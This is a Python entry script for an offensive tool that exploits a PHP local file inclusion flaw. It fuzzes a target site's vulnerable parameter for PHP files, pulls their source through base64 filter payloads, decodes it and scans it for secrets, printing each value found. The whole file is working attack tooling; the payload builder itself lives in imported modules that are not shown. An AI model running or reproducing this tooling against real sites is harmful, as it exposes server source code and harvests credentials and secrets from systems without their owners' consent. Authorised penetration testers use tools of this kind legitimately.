#!/usr/bin/env python3
"""
PHP Filter LFI Source Code Disclosure Tool (Refactored)
Follows SOLID principles via modular components.
Supports independent execution of discovery, extraction, and decoding phases.
"""

import argparse
import sys
import base64
import json
from pathlib import Path
from typing import List, Optional

from php_filters.core.colors import Colors
from php_filters.core.models import ExtractResult
from php_filters.discovery.ffuf import FFufDiscovery
from php_filters.discovery.builtin import BuiltinDiscovery
from php_filters.extraction.extractor import Extractor
from php_filters.analysis.secret_scanner import SecretScanner
from php_filters.reporting.reporter import Reporter


def cmd_discover(args):
    """Phase 1: Discover PHP files and save to a list"""
    print(f"{Colors.BLUE}[PHASE 1] Discovering PHP files{Colors.NC}")
    print("=" * 60)
    
    url = args.url
    param = args.param
    wordlist = args.wordlist
    output_file = args.output or "discovered_files.txt"
    
    if args.use_ffuf:
        candidates = FFufDiscovery().discover(url, param, wordlist)
        if not candidates:
            print(f"{Colors.YELLOW}[*] Falling back to built-in discovery{Colors.NC}")
            candidates = BuiltinDiscovery().discover(url, param, wordlist)
    else:
        candidates = BuiltinDiscovery().discover(url, param, wordlist)
    
    if not candidates:
        print(f"{Colors.RED}[!] No PHP files discovered{Colors.NC}")
        sys.exit(1)
    
    # Save discovered files
    Path(output_file).write_text('\n'.join(candidates))
    print(f"{Colors.GREEN}[+] Found {len(candidates)} PHP files{Colors.NC}")
    print(f"{Colors.GREEN}[+] Saved to: {output_file}{Colors.NC}")


def cmd_extract(args):
    """Phase 2: Extract PHP source using filters and save raw responses"""
    print(f"{Colors.BLUE}[PHASE 2] Extracting PHP source code{Colors.NC}")
    print("=" * 60)
    
    url = args.url
    param = args.param
    files_list = args.files
    output_dir = Path(args.output or "extracted_raw")
    output_dir.mkdir(exist_ok=True)
    
    # Load file list
    if files_list.endswith('.txt'):
        candidates = [line.strip() for line in Path(files_list).read_text().splitlines() if line.strip()]
    else:
        candidates = [f.strip() for f in files_list.split(',')]
    
    extractor = Extractor()
    results = []
    
    for filename in candidates:
        print(f"{Colors.YELLOW}[*] Extracting: {filename}{Colors.NC}")
        payload = extractor.build_payload(filename)
        html = extractor.fetch(url, param, payload)
        
        if not html:
            print(f"{Colors.RED}  [✗] Failed request{Colors.NC}")
            continue
            
        encoded = extractor.extract_base64(html)
        if not encoded:
            print(f"{Colors.RED}  [✗] No base64 content found{Colors.NC}")
            continue
        
        # Save raw base64
        safe_name = filename.replace('/', '_').replace('\\', '_')
        raw_file = output_dir / f"{safe_name}.b64"
        raw_file.write_text(encoded)
        
        results.append({
            'filename': filename,
            'raw_file': str(raw_file),
            'base64_length': len(encoded)
        })
        
        print(f"{Colors.GREEN}  [✓] Saved base64 to: {raw_file}{Colors.NC}")
    
    # Save extraction manifest
    manifest = output_dir / "manifest.json"
    manifest.write_text(json.dumps(results, indent=2))
    print(f"\n{Colors.GREEN}[+] Extracted {len(results)} files{Colors.NC}")
    print(f"{Colors.GREEN}[+] Manifest: {manifest}{Colors.NC}")


def cmd_decode(args):
    """Phase 3: Decode base64 files, validate PHP, and scan for secrets"""
    print(f"{Colors.BLUE}[PHASE 3] Decoding and analyzing PHP source{Colors.NC}")
    print("=" * 60)
    
    input_dir = Path(args.input)
    output_dir = Path(args.output or "php_sources")
    output_dir.mkdir(exist_ok=True)
    
    # Load manifest if exists
    manifest_file = input_dir / "manifest.json"
    if manifest_file.exists():
        manifest = json.loads(manifest_file.read_text())
        b64_files = [(item['filename'], Path(item['raw_file'])) for item in manifest]
    else:
        # Fallback: scan for .b64 files
        b64_files = [(f.stem, f) for f in input_dir.glob("*.b64")]
    
    scanner = SecretScanner()
    results = []
    all_secrets = []
    
    for filename, b64_path in b64_files:
        print(f"{Colors.YELLOW}[*] Decoding: {filename}{Colors.NC}")
        
        encoded = b64_path.read_text()
        
        try:
            decoded_bytes = base64.b64decode(encoded)
            try:
                source_code = decoded_bytes.decode('utf-8')
            except UnicodeDecodeError:
                source_code = decoded_bytes.decode('latin-1')
        except Exception as e:
            print(f"{Colors.RED}  [✗] Decode error: {e}{Colors.NC}")
            continue
        
        if '<?php' not in source_code and '<?=' not in source_code:
            print(f"{Colors.RED}  [✗] Doesn't appear to be PHP code{Colors.NC}")
            continue
        
        # Scan for secrets
        secrets = scanner.scan(source_code, filename)
        
        # Save decoded source
        safe_name = filename.replace('/', '_').replace('\\', '_')
        php_file = output_dir / f"{safe_name}.php"
        php_file.write_text(source_code)
        
        print(f"{Colors.GREEN}  [✓] Decoded to: {php_file}{Colors.NC}")
        if secrets:
            print(f"{Colors.GREEN}  [✓] Found {len(secrets)} potential secrets!{Colors.NC}")
            all_secrets.extend(secrets)
        
        results.append({
            'filename': filename,
            'php_file': str(php_file),
            'secrets_count': len(secrets)
        })
    
    # Generate report
    print()
    print(f"{Colors.BLUE}╔════════════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.BLUE}║                  DECODE REPORT                         ║{Colors.NC}")
    print(f"{Colors.BLUE}╚════════════════════════════════════════════════════════╝{Colors.NC}")
    print()
    print(f"{Colors.BOLD}Summary:{Colors.NC}")
    print(f"  Files decoded: {len(results)}")
    print(f"  Secrets found: {len(all_secrets)}")
    print()
    
    if all_secrets:
        print(f"{Colors.RED}{Colors.BOLD}[!] SENSITIVE INFORMATION DISCOVERED:{Colors.NC}")
        print()
        by_type = {}
        for s in all_secrets:
            by_type.setdefault(s.type, []).append(s)
        for secret_type, items in by_type.items():
            print(f"{Colors.YELLOW}{secret_type}:{Colors.NC}")
            for s in items:
                print(f"  File: {s.file} (line {s.line})")
                print(f"  Value: {Colors.RED}{s.value}{Colors.NC}")
                print()
    
    # Save report
    report_file = output_dir / "secrets_report.txt"
    with open(report_file, 'w') as f:
        f.write("PHP Source Decode Report\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Files Decoded: {len(results)}\n")
        f.write(f"Secrets Found: {len(all_secrets)}\n\n")
        if all_secrets:
            f.write("SENSITIVE INFORMATION:\n")
            f.write("-" * 60 + "\n\n")
            by_type = {}
            for s in all_secrets:
                by_type.setdefault(s.type, []).append(s)
            for secret_type, items in by_type.items():
                f.write(f"{secret_type}:\n")
                for s in items:
                    f.write(f"  File: {s.file} (line {s.line})\n")
                    f.write(f"  Value: {s.value}\n\n")
    
    print(f"{Colors.GREEN}[+] Report saved to: {report_file}{Colors.NC}")


def print_phase(title: str) -> None:
    print(f"{Colors.BLUE}{title}{Colors.NC}")
    print("=" * 60)


def discover_candidates(url: str, param: str, files: Optional[List[str]], wordlist: Optional[str], use_ffuf: bool) -> List[str]:
    if files:
        print_phase("[PHASE 1] Testing specific files")
        return files
    if wordlist:
        print_phase("[PHASE 1] Discovering PHP files")
        if use_ffuf:
            found = FFufDiscovery().discover(url, param, wordlist)
            if not found:
                print(f"{Colors.YELLOW}[*] Falling back to built-in discovery{Colors.NC}")
                return BuiltinDiscovery().discover(url, param, wordlist)
            return found
        return BuiltinDiscovery().discover(url, param, wordlist)
    print(f"{Colors.RED}[!] Must provide either --wordlist or --files{Colors.NC}")
    sys.exit(1)


def fetch_html_with_payload(extractor: Extractor, url: str, param: str, filename: str) -> Optional[str]:
    print(f"{Colors.YELLOW}[*] Extracting: {filename}{Colors.NC}")
    payload = extractor.build_payload(filename)
    html = extractor.fetch(url, param, payload)
    if not html:
        print(f"{Colors.RED}  [✗] Failed request{Colors.NC}")
    return html


def decode_base64_content(encoded: str) -> Optional[str]:
    try:
        decoded_bytes = base64.b64decode(encoded)
        try:
            return decoded_bytes.decode('utf-8')
        except UnicodeDecodeError:
            return decoded_bytes.decode('latin-1')
    except Exception as e:
        print(f"{Colors.RED}  [✗] Base64 decode error: {e}{Colors.NC}")
        return None


def is_php_source(source_code: str) -> bool:
    return ('<?php' in source_code) or ('<?=' in source_code)


def process_candidates(candidates: List[str], url: str, param: str, extractor: Extractor, scanner: SecretScanner, reporter: Reporter) -> None:
    print()
    print_phase("[PHASE 2] Extracting PHP source code")
    for filename in candidates:
        html = fetch_html_with_payload(extractor, url, param, filename)
        if not html:
            continue
        encoded = extractor.extract_base64(html)
        if not encoded:
            print(f"{Colors.RED}  [✗] No base64 content found{Colors.NC}")
            continue
        source_code = decode_base64_content(encoded)
        if not source_code:
            continue
        if not is_php_source(source_code):
            print(f"{Colors.RED}  [✗] Doesn't appear to be PHP code{Colors.NC}")
            continue
        secrets = scanner.scan(source_code, filename)
        result = ExtractResult(filename=filename, source_code=source_code, secrets=secrets)
        result.output_file = reporter.save_source(filename, source_code)
        reporter.add_result(result)


def orchestrate(url: str, param: str, output: str, files: List[str] = None, wordlist: str = None, use_ffuf: bool = True):
    reporter = Reporter(url, param, output)
    reporter.banner()
    extractor = Extractor()
    scanner = SecretScanner()

    candidates = discover_candidates(url, param, files, wordlist, use_ffuf)
    if not candidates:
        print(f"{Colors.RED}[!] No PHP files discovered{Colors.NC}")
        sys.exit(1)

    process_candidates(candidates, url, param, extractor, scanner, reporter)

    reporter.report()


def main():
    parser = argparse.ArgumentParser(
        description='PHP Filter LFI Source Code Disclosure Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Commands')
    
    # Discover command
    discover_parser = subparsers.add_parser('discover', help='Phase 1: Discover PHP files')
    discover_parser.add_argument('-u', '--url', required=True, help='Target URL')
    discover_parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
    discover_parser.add_argument('-w', '--wordlist', required=True, help='Wordlist for fuzzing')
    discover_parser.add_argument('-o', '--output', help='Output file (default: discovered_files.txt)')
    discover_parser.add_argument('--use-ffuf', action='store_true', default=True, help='Use ffuf (default)')
    discover_parser.add_argument('--no-ffuf', dest='use_ffuf', action='store_false', help='Use built-in discovery')
    
    # Extract command
    extract_parser = subparsers.add_parser('extract', help='Phase 2: Extract PHP source via filters')
    extract_parser.add_argument('-u', '--url', required=True, help='Target URL')
    extract_parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
    extract_parser.add_argument('-f', '--files', required=True, help='File list (path to .txt or comma-separated)')
    extract_parser.add_argument('-o', '--output', help='Output directory (default: extracted_raw)')
    
    # Decode command
    decode_parser = subparsers.add_parser('decode', help='Phase 3: Decode base64 and scan for secrets')
    decode_parser.add_argument('-i', '--input', required=True, help='Input directory with .b64 files')
    decode_parser.add_argument('-o', '--output', help='Output directory (default: php_sources)')
    
    # Full pipeline (legacy mode)
    full_parser = subparsers.add_parser('full', help='Run full pipeline (discover + extract + decode)')
    full_parser.add_argument('-u', '--url', required=True, help='Target URL')
    full_parser.add_argument('-p', '--param', required=True, help='Vulnerable parameter name')
    full_parser.add_argument('-w', '--wordlist', help='Wordlist for PHP file discovery')
    full_parser.add_argument('-f', '--files', help='Comma-separated list of specific files to test')
    full_parser.add_argument('-o', '--output', default='php_sources', help='Output directory (default: php_sources)')
    full_parser.add_argument('--no-ffuf', action='store_true', help='Use built-in fuzzing instead of ffuf')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    if args.command == 'discover':
        cmd_discover(args)
    elif args.command == 'extract':
        cmd_extract(args)
    elif args.command == 'decode':
        cmd_decode(args)
    elif args.command == 'full':
        # Legacy full pipeline
        files_list = [f.strip() for f in args.files.split(',')] if args.files else None
        orchestrate(
            url=args.url,
            param=args.param,
            output=args.output,
            files=files_list,
            wordlist=args.wordlist,
            use_ffuf=(not args.no_ffuf)
        )


if __name__ == '__main__':
    main()